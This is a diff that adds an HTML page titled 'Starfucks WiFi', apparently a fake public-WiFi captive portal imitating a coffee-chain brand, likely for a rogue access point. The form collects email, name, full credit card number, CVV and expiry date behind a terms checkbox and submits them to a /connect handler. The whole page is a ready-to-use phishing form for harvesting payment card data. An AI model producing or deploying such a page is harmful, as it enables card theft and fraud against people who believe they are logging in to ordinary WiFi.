@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<title>Starfucks WiFi</title>
+<meta name="viewport" content="initial-scale=1.0">
+<link rel="stylesheet" href="pure-min.css">
+
+<center><img src="/top_logo.jpg" alt="Top Logo"  style="width:150px;height:160px;border:10;">
+
+<form action="/connect" class="pure-form pure-form-aligned">
+<fieldset>
+    <div class="pure-control-group">
+      <label for="email">Email</label>
+      <input name="email" id="email" type="email"  required placeholder="E-Mail">
+    </div>
+    <div class="pure-control-group">
+      <label for="name">Name</label>
+      <input name="name" id="name" type="text"  required placeholder="First/Last Name">
+    </div>
+    <div class="pure-control-group">
+      <label for="cardnum">Credit-Card Number</label>
+      <input name="cardnum" id="cardnum" type="text" required placeholder="Credit Card Number">
+    </div>
+    <div class="pure-control-group">
+      <label for="csv">CSV</label>
+      <input name="csv" id="csv"  type="number" min="000" max="999"  required placeholder="CSV">
+    </div>
+    <div class="pure-control-group">
+      <label for="expdate">Expiration Date</label>
+      <input name="expdate" id="expdate" type="date" required placeholder="Date ">
+    </div>
+    <div class="pure-controls">
+      <label class="pure-checkbox">
+        <input type="checkbox"  required>
+        I've read the terms and conditions
+      </label>
+    </div>  
+    <div class="pure-control-group">
+      <input type="image" src="/accept_button.jpg" alt="Submit" >
+    </div>
+</fieldset>
+</form>
+</center>
